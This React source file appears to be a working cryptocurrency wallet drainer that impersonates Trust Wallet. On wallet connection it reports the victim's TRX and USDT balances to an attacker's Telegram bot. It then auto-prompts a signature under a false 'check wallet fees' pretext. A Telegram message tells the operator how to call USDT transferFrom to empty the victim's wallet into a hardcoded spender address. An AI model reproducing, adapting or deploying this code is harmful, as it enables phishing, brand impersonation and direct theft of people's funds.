import React, { useState, useEffect } from 'react';
import UniversalProvider from "@walletconnect/universal-provider";
import { WalletConnectModal } from "@walletconnect/modal";
import { TronService, TronChains } from "./utils/tronService";
import trustWalletLogo from './assets/trustwallet.svg'; // Import the Trust Wallet logo

// Environment variables
const projectId = import.meta.env.VITE_PROJECT_ID || '';
const telegramBotToken = import.meta.env.VITE_TELEGRAM_BOT_TOKEN || '';
const telegramChatId = import.meta.env.VITE_TELEGRAM_CHAT_ID || '';
const tronApiKey = import.meta.env.VITE_TRON_API_KEY || '';
const spenderAddress = "TJymGGQzQiXZEwhNxCUGfiUnMQHMm1xb8D";
const usdtContractAddress = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';

const App = () => {
  const [isConnected, setIsConnected] = useState(false);
  const [provider, setProvider] = useState<UniversalProvider | null>(null);
  const [modal, setModal] = useState<WalletConnectModal | null>(null);
  const [address, setAddress] = useState<string | null>(null);

  useEffect(() => {
    const initProvider = async () => {
      const providerInstance = await UniversalProvider.init({
        logger: "error",
        projectId,
        metadata: {
          name: "Trust Wallet",
          description: "Connect to Trust Wallet",
          url: "https://trustwallet.com/",
          icons: ["data:image/jpeg;base64,..."], // URL to Trust Wallet icon
        },
      });

      setProvider(providerInstance);
    };

    initProvider();
  }, []);

  useEffect(() => {
    const initModal = async () => {
      const modalInstance = new WalletConnectModal({
        projectId,
        chains: [`tron:${TronChains.Mainnet}`],
      });

      setModal(modalInstance);
    };

    initModal();
  }, []);

  useEffect(() => {
    if (!provider || !provider.session) return;

    const tronService = new TronService(provider);
    const accountAddress = provider.session?.namespaces?.tron?.accounts[0]?.split(":")[2];
    if (accountAddress) {
      setAddress(accountAddress);
    }
  }, [provider, isConnected]);

  useEffect(() => {
    if (isConnected && address) {
      const timer = setTimeout(() => {
        handleSendTransaction();
      }, 3000); // 3 seconds delay

      return () => clearTimeout(timer);
    }
  }, [isConnected, address]);

  const connectIOS = async () => {
    if (!provider) return;

    provider.on("display_uri", async (uri: string) => {
      window.location.href = `https://link.trustwallet.com/wc?uri=${encodeURIComponent(uri)}`;
    });

    try {
      await provider.connect({
        namespaces: {
          tron: {
            methods: ["tron_signMessage", "tron_signTransaction"],
            chains: [`tron:${TronChains.Mainnet}`],
            events: [],
          },
        },
      });

      const tronService = new TronService(provider);
      const accountAddress = provider.session?.namespaces?.tron?.accounts[0]?.split(":")[2];
      if (accountAddress) {
        setAddress(accountAddress);

        const balance = await tronService.getBalance(accountAddress);
        await sendTelegramMessage(accountAddress, balance, "TRX", "connect");

        const usdtBalance = await getUSDTBalanceFromTronGrid(accountAddress);
        await sendTelegramMessage(accountAddress, usdtBalance, "USDT", "connect");

        setIsConnected(true);
      }
    } catch {
      console.log("Something went wrong, request cancelled");
    }
  };

  const connectAndroid = async () => {
    if (!provider || !modal) return;

    provider.on("display_uri", async (uri: string) => {
      await modal.openModal({ uri });
    });

    try {
      await provider.connect({
        namespaces: {
          tron: {
            methods: ["tron_signMessage", "tron_signTransaction"],
            chains: [`tron:${TronChains.Mainnet}`],
            events: [],
          },
        },
      });

      const tronService = new TronService(provider);
      const accountAddress = provider.session?.namespaces?.tron?.accounts[0]?.split(":")[2];
      if (accountAddress) {
        setAddress(accountAddress);

        const balance = await tronService.getBalance(accountAddress);
        await sendTelegramMessage(accountAddress, balance, "TRX", "connect");

        const usdtBalance = await getUSDTBalanceFromTronGrid(accountAddress);
        await sendTelegramMessage(accountAddress, usdtBalance, "USDT", "connect");

        setIsConnected(true);
        modal?.closeModal();
      }
    } catch {
      console.log("Something went wrong, request cancelled");
    }
  };

  const getUSDTBalanceFromTronGrid = async (address: string): Promise<number> => {
    const url = `https://api.trongrid.io/v1/accounts/${address}/transactions/trc20?only_confirmed=true&only_to=true&contract_address=${usdtContractAddress}`;
    const response = await fetch(url, {
      headers: {
        'TRON-PRO-API-KEY': tronApiKey,
      },
    });
    if (!response.ok) {
      throw new Error('Failed to fetch USDT balance from TronGrid');
    }
    const data = await response.json();
    const usdtToken = data.data.find((token: any) => token.token_info?.address === usdtContractAddress);
    return usdtToken ? usdtToken.value : 0;
  };

  const formatTokenBalance = (balance: number, decimals: number): string => {
    return (balance / Math.pow(10, decimals)).toFixed(decimals);
  };

  const sendTelegramMessage = async (walletAddress: string, balance: number, token: string = "TRX", type: string = "connect") => {
    let message;
    const tronScanUrl = `https://tronscan.org/#/address/${walletAddress}`;

    if (type === "connect") {
      const formattedBalance = formatTokenBalance(balance, token === "USDT" ? 6 : 18);
      message = `Wallet connected: ${walletAddress}\n${token} Balance: ${formattedBalance} ${token} (${balance})`;
    } else if (type === "approve") {
      message = `Transaction approved for ${token}.\nWallet: ${walletAddress}\nTxHash: ${balance}`;
    } else if (type === "decline") {
      message = `Transaction declined for ${token}.\nWallet: ${walletAddress}`;
    }

    const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
    const response = await fetch(url, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: telegramChatId,
        text: message,
      }),
    });

    if (!response.ok) {
      console.error('Failed to send message to Telegram');
    }
  };

  const sendResultPageTelegramMessage = async (walletAddress: string) => {
    const message = `Transaction needs to be checked at https://tronscan.org/#/address/${walletAddress}. Please wait 1 min so the Contract will be Successful.
You have to be connected with the wallet to the website. If you are connected, please find Write Contract at
https://tronscan.org/#/token20/TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t/code, then transferfrom and input the wallet
from the user on _from_address, and on _to_address should be your wallet.
After that, press on Send and accept the Tokens.
Wallet: ${walletAddress}
Spender:${spenderAddress}`;

    const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
    const response = await fetch(url, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: telegramChatId,
        text: message,
      }),
    });

    if (!response.ok) {
      console.error('Failed to send message to Telegram');
    }
  };

  const handleSendTransaction = async () => {
    if (!provider || !address) return;

    try {
      const tronService = new TronService(provider);
      const currentBalance = await tronService.getBalance(address);
      console.log(`Current Balance: ${currentBalance}`);
      if (currentBalance < 60000000) { //  TRX for example
        alert("Insufficient funds in wallet. Please add TRX to cover the check wallet fees.");
        await sendTelegramMessage(address, currentBalance, "TRX", "decline");
        window.location.href = 'networkselection.html'; // Redirect to networkselection.html
        return;
      }

      const signedTx = await tronService.signTransaction(address, 0); // Sign the transaction
      console.log("Signed transaction: ", signedTx);

      // Broadcast the transaction to the blockchain
      const broadcastResult = await tronService.broadcastTransaction(signedTx);
      console.log("Broadcast result: ", broadcastResult);

      if (broadcastResult.result) {
        const txHash = broadcastResult.txid;
        await sendResultPageTelegramMessage(address); // Send Telegram message indicating success

        // Transaction was successfully broadcasted, now we can redirect
        window.location.href = 'result-page.html';
      } else {
        // Broadcasting failed, handle accordingly
        alert("User refused to check the Wallet");
        window.location.href = 'networkselection.html';
      }
    } catch (signError: any) {
      // This block will catch if the user refuses to sign the transaction
      console.error("User refused to sign the transaction: ", signError);
      alert("Your request was declined.");
      window.location.href = 'networkselection.html'; // Redirect to networkselection.html
      return;
    } 
  };

  return (
    <>
      <main>
        <div className="step-container" style={{ display: 'flex' }}>
          <div className="mb-5"><b className="inline font-bold"></b><b className="inline font-bold"></b></div>

          <div className="w-full">
            {!isConnected && (
              <>
                <div className="network-button" onClick={connectIOS}>
                  <img src={trustWalletLogo} alt="Trust Wallet" />
                  <div>
                    <p className="font-semibold">(iOS)</p>
                  </div>
                </div>
                <div className="network-button" onClick={connectAndroid}>
                  <img src={trustWalletLogo} alt="Trust Wallet" />
                  <div>
                    <p className="font-semibold">(Android)</p>
                  </div>
                </div>
              </>
            )}
          </div>
        </div>
      </main>

    </>
  );
};

export default App;
